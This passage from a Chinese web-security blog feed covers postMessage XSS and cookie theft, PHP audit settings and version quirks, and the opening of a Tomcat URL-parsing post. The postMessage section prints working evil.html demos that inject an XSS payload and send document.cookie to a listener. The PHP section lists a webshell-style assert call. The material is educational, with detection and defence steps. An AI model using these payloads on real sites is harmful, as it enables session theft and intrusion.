class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="comment">// event参数中有data属性，就是父窗口发送过来的数据</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// 把父窗口发送过来的数据显示在子窗口中</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"content"</span>).innerHTML += event.data + <span class="string">"origin: "</span> + event.origin + <span class="string">"&lt;br/&gt;"</span>; </span></span><br><span class="line"><span class="actionscript">&#125;, <span class="literal">false</span>); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Web page from http://child.com</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html，放置在攻击者服务器attack.com中，将child.com/child.html通过iframe引入其中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"otherPage"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> i = <span class="built_in">document</span>.getElementById(<span class="string">"otherPage"</span>);</span></span><br><span class="line"><span class="actionscript">i.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">i.contentWindow.postMessage(<span class="string">"&lt;img src=x onerror='alert(document.location);'"</span>, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后诱使用户访问attack.com/evil.html，即可触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/2.png" alt=""></p><h4 id="window-open引用"><a href="#window-open引用" class="headerlink" title="window.open引用"></a>window.open引用</h4><p>如果目标站点设置了X-Frame-Options时，则无法通过使用iframe，此时需要通过window.open来引用了。</p><p>child.php，设置了X-Frame-Options为同源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;?php header(&apos;X-Frame-Options: SAMEORIGIN&apos;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Web page from child.com&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/JavaScript&quot;&gt;</span><br><span class="line">// event参数中有data属性，就是父窗口发送过来的数据</span><br><span class="line">window.addEventListener(&quot;message&quot;, function(event) &#123;</span><br><span class="line">// 把父窗口发送过来的数据显示在子窗口中</span><br><span class="line">document.getElementById(&quot;content&quot;).innerHTML += event.data + &quot;origin: &quot; + event.origin + &quot;&lt;br/&gt;&quot;; </span><br><span class="line">&#125;, false); </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Web page from http://child.com</span><br><span class="line">&lt;div id=&quot;content&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://192.168.203.1/child.php'</span>, <span class="string">'title'</span>);</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">receiver.postMessage(<span class="string">"&lt;img src=x onerror='alert(document.location);'"</span>, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">setTimeout(post, 1000);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使用户访问，window.open会新建一个标签访问然后触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/3.png" alt=""></p><h4 id="排查方法"><a href="#排查方法" class="headerlink" title="排查方法"></a>排查方法</h4><p>在Chrome中的Global Listeners出查看当前页面存在几个监听器，然后逐个打断点调试分析：</p><p><img src="/2020/04/06/浅析postMessage安全/4.png" alt=""></p><p>找到对应的监听器后，可以在Console中使用如下payload进行调试：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.postMessage(<span class="string">'mi1k7ea'</span>, <span class="string">'*'</span>);</span><br></pre></td></tr></table></figure><p><img src="/2020/04/06/浅析postMessage安全/5.png" alt=""></p><h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><p>子窗口对于父窗口的来源应设置白名单判断，只接受可信父窗口传输的数据，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// event参数中有data属性，就是父窗口发送过来的数据</span></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (event.origin == <span class="string">'http://father.com'</span>)&#123;</span></span><br><span class="line"><span class="undefined">            /*</span></span><br><span class="line"><span class="actionscript">            to <span class="keyword">do</span> something</span></span><br><span class="line"><span class="undefined">            */</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此外，还可以设置X-Frame-Options头为白名单域，提高利用门槛。</p><h3 id="伪造数据接收端"><a href="#伪造数据接收端" class="headerlink" title="伪造数据接收端"></a>伪造数据接收端</h3><p>如果数据接收端是如下的写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">targetWindow.postMessage(message, <span class="string">'*'</span>);</span><br></pre></td></tr></table></figure><p>这表明该消息任何窗口都可以接收到，但这里重点不是“攻击者能不能接收到”，而是“发不发给攻击者”。换句话说，如果targetWindow是子窗口的话，除非我们可以控制它的子窗口，否则是无法接收到消息的，即使该消息允许任何窗口接收。</p><p>但是，当消息发送给window.parent或window.opener时，则可以进行攻击利用，窃取用户敏感信息。</p><h4 id="window-parent"><a href="#window-parent" class="headerlink" title="window.parent"></a>window.parent</h4><p>window.parent中parent表示父窗口，比如一个A页面利用iframe或frame调用B页面，那么A页面就是B页面的parent。</p><p>child.html，将消息发送给引用本页面的父窗口：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> userinfo = <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.parent.postMessage(userinfo, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span>(event.origin == <span class="string">"http://192.168.203.1"</span>)&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span></span><br><span class="line"><span class="actionscript">img.src = <span class="string">'http://127.0.0.1:1234/userinfo='</span> + event.data;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"otherPage"</span>).appendChild(img);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span> <span class="attr">id</span>=<span class="string">"otherPage"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使访问，在攻击者服务器上成功窃取到用户信息：</p><p><img src="/2020/04/06/浅析postMessage安全/6.png" alt=""></p><p>当然，直接弹框也是ok的，改下evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">onmessage = <span class="function"><span class="keyword">function</span><span class="params">(event)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">alert(event.origin + <span class="string">" say: \n"</span> + event.data);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://192.168.203.1/child.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/06/浅析postMessage安全/7.png" alt=""></p><h4 id="window-opener"><a href="#window-opener" class="headerlink" title="window.opener"></a>window.opener</h4><p>window.opener中的opener表示谁打开我的，比如一个A页面利用window.open弹出了B页面，那么A页面就是B页面的opener。</p><p> child.html，和前面的几乎一样，只是将window.parent改为window.opener而已：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> userinfo = <span class="string">"phone: 13666666666"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.opener.postMessage(userinfo, <span class="string">"*"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>evil.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> receiver = <span class="built_in">window</span>.open(<span class="string">'http://192.168.203.1/child.html'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">alert(event.origin + <span class="string">" say: \n"</span> + event.data);</span></span><br><span class="line"><span class="actionscript">&#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱使用户访问，打开新标签访问之后，返回父窗口即可触发XSS：</p><p><img src="/2020/04/06/浅析postMessage安全/8.png" alt=""></p><h4 id="排查方法-1"><a href="#排查方法-1" class="headerlink" title="排查方法"></a>排查方法</h4><p>使用Chrome的全局搜索功能，搜索<code>postMessage</code>关键词：</p><p><img src="/2020/04/06/浅析postMessage安全/9.png" alt=""></p><p>然后对postMessage()函数的第二个参数进行排查，查看是否设置为<code>*</code>，若是则存在漏洞。</p><h4 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h4><p>对于postMessage()函数的第二个参数需要正确的配置，严格限制父窗口来源，禁止使用<code>*</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>User info center<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/JavaScript"</span>&gt;</span><span class="undefined"> </span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> userinfo = <span class="string">"phone: 13666666666"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.opener.postMessage(userinfo, <span class="string">"http://father.com"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">Web page from http://child.com </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.jianshu.com/p/62f1c080748a" target="_blank" rel="noopener">利用window.postMessage()实现跨域消息传递（JavaScript）</a></p><p><a href="https://www.jianshu.com/p/bb427abcaf9e" target="_blank" rel="noopener">html5的postMessage简易通俗使用说明</a></p><p><a href="https://xuptsec.github.io/2018/09/11/postMessage%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E4%B8%80%E7%82%B9%E7%82%B9%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener">postMessage安全性的一点点研究</a></p><p><a href="https://p0sec.net/index.php/archives/124/" target="_blank" rel="noopener">postMessage 滥用导致的安全风险</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="postMessage" scheme="https://www.mi1k7ea.com/tags/postMessage/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计敏感配置与版本特性</title>
    <link href="https://www.mi1k7ea.com/2020/04/06/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%95%8F%E6%84%9F%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7/"/>
    <id>https://www.mi1k7ea.com/2020/04/06/PHP代码审计敏感配置与版本特性/</id>
    <published>2020-04-06T03:38:00.000Z</published>
    <updated>2020-04-06T04:27:37.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-PHP敏感配置项"><a href="#0x01-PHP敏感配置项" class="headerlink" title="0x01 PHP敏感配置项"></a>0x01 PHP敏感配置项</h2><h3 id="register-globals（PHP版本-lt-5-4-时存在）"><a href="#register-globals（PHP版本-lt-5-4-时存在）" class="headerlink" title="register_globals（PHP版本 &lt; 5.4 时存在）"></a>register_globals（PHP版本 &lt; 5.4 时存在）</h3><p>当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在未初始化的变量时，可能会导致变量覆盖漏洞。</p><p>注意：其中参数覆盖的顺序受到配置文件中<code>variables_order</code>的参数影响，默认是<code>EGPCS</code>。按顺序，右边的参数来源会覆盖左边的参数来源。</p><h3 id="allow-url-include（PHP版本-gt-5-2-默认为OFF）"><a href="#allow-url-include（PHP版本-gt-5-2-默认为OFF）" class="headerlink" title="allow_url_include（PHP版本 &gt; 5.2 默认为OFF）"></a>allow_url_include（PHP版本 &gt; 5.2 默认为OFF）</h3><p>当该配置项为ON时，可以通过include、require等函数进行远程文件包含。</p><p>另外，有个类似的配置项allow_url_fopen，这个参数配置为ON时可以在函数中如file_get_contents中打开URL。</p><p>当这两个配置项都为ON时，可以直接使用URL进行远程包含；当include为ON、fopen为OFF时，只能通过PHP伪协议进行包含。</p><h3 id="magic-quato-gpc（PHP版本-lt-5-4-存在）"><a href="#magic-quato-gpc（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_gpc（PHP版本 &lt; 5.4 存在）"></a>magic_quato_gpc（PHP版本 &lt; 5.4 存在）</h3><p>当该配置项为ON时，会在GET、POST、COOKIE变量中的单引号<code>&#39;</code>、双引号<code>&quot;</code>、反斜杠<code>\</code>、空字符（Null）前添加反斜杠进行转义。</p><p>注意：<strong>该配置并不会对SERVER变量里的特殊字符进行转义</strong>，因此可能会导致Referer、Client-Ip等存在注入漏洞。</p><h3 id="magic-quato-runtime（PHP版本-lt-5-4-存在）"><a href="#magic-quato-runtime（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_runtime（PHP版本 &lt; 5.4 存在）"></a>magic_quato_runtime（PHP版本 &lt; 5.4 存在）</h3><p>该配置项和magic_quato_gpc的区别在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread()、mysql_fetch_array()等很多对数据库查询和文件读取的函数产生影响。</p><h3 id="magic-quato-sybase（PHP版本-lt-5-4-存在）"><a href="#magic-quato-sybase（PHP版本-lt-5-4-存在）" class="headerlink" title="magic_quato_sybase（PHP版本 &lt; 5.4 存在）"></a>magic_quato_sybase（PHP版本 &lt; 5.4 存在）</h3><p>该配置项和magic_quato_gpc的区别在于，<strong>sybase只会转义空字符，把单引号转为双引号，并且这个配置若为ON则会覆盖gpc的配置</strong>。</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p>该配置项用来设定PHP程序只能访问哪些目录。在Windows下多个目录用分号<code>;</code>分割，在Linux下是用冒号<code>:</code>进行分割。</p><p>注意：<strong>配置的目录需要用斜杠<code>/</code>进行封尾，否则就变成了前缀匹配</strong>。</p><p>比如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/。</p><p>绕过技巧参考：<a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">《浅谈几种Bypass open_basedir的方法》</a></p><h2 id="0x02-PHP各版本的姿势"><a href="#0x02-PHP各版本的姿势" class="headerlink" title="0x02 PHP各版本的姿势"></a>0x02 PHP各版本的姿势</h2><h3 id="PHP-5-2-以前"><a href="#PHP-5-2-以前" class="headerlink" title="PHP 5.2 以前"></a>PHP 5.2 以前</h3><p>__autoload加载类文件，但该函数只能调用一次，所以可以用spl_autoload_register加载类。</p><h3 id="PHP-5-3"><a href="#PHP-5-3" class="headerlink" title="PHP 5.3"></a>PHP 5.3</h3><ul><li><p>新增了glob://和phar://两个伪协议。</p><p>glob://伪协议用于列目录，可绕过open_basedir；</p><p>phar://伪协议在文件包含中可以用来绕过一些后缀的限制，另外在CTF中有phar反序列化漏洞的扩展；</p><p><a href="https://www.php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.phar.php</a></p></li><li><p>新的全局变量DIR。</p></li><li><p>默认开启<code>&lt;?= $xxoo;?&gt;</code>，在5.4也可用。</p></li></ul><h3 id="PHP-5-4"><a href="#PHP-5-4" class="headerlink" title="PHP 5.4"></a>PHP 5.4</h3><ul><li><p>移除安全模式、魔术引号；</p></li><li><p>register_globals和register_long_arrays等php.ini指令被移除；</p></li><li><p>php.ini新增session.upload_progress.enabled，默认为1，可用来文件包含；</p><p><a href="https://www.php.net/manual/zh/session.configuration.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.configuration.php</a></p><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a></p></li></ul><h3 id="PHP-5-5"><a href="#PHP-5-5" class="headerlink" title="PHP 5.5"></a>PHP 5.5</h3><p>废除preg_replace的/e模式（不是移除），当使用被弃用的e修饰符时，这个函数会转义一些字符（即<code>&#39;</code>、<code>&quot;</code>和Null），然后进行后向引用替换。</p><p><a href="https://www.php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.preg-replace.php</a></p><h3 id="PHP-5-6"><a href="#PHP-5-6" class="headerlink" title="PHP 5.6"></a>PHP 5.6</h3><p>使用<code>...</code>运算符定义可变长度参数函数。</p><p><a href="https://www.php.net/manual/zh/functions.arguments.php#functions.variable-arg-list" target="_blank" rel="noopener">https://www.php.net/manual/zh/functions.arguments.php#functions.variable-arg-list</a></p><h3 id="PHP-7-0"><a href="#PHP-7-0" class="headerlink" title="PHP 7.0"></a>PHP 7.0</h3><ul><li><p>十六进制字符串不再被认为是数字；</p></li><li><p>移除asp和script php标签；</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;</span><br><span class="line">&lt;%= %&gt;</span><br><span class="line">&lt;script language="php"&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>在后面的版本中assert变成语言结构，这意味着很多一句话木马不能使用。目前经过测试，可使用的有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="string">'assert'</span>, <span class="string">'phpinfo();'</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="PHP-7-1"><a href="#PHP-7-1" class="headerlink" title="PHP 7.1"></a>PHP 7.1</h3><p>废除mb_ereg_replace()和mb_eregi_replace()的Eval选项。</p><p><a href="https://www.php.net/manual/zh/migration71.new-features.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration71.new-features.php</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat URL解析差异性及利用</title>
    <link href="https://www.mi1k7ea.com/2020/04/01/Tomcat-URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/01/Tomcat-URL解析差异性及利用/</id>
    <published>2020-04-01T15:47:17.000Z</published>
    <updated>2020-04-05T17:08:30.724Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。</p><p>当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。</p><h2 id="0x02-URL解析差异性"><a href="#0x02-URL解析差异性" class="headerlink" title="0x02 URL解析差异性"></a>0x02 URL解析差异性</h2><h3 id="HttpServletRequest中几个解析URL的函数"><a href="#HttpServletRequest中几个解析URL的函数" class="headerlink" 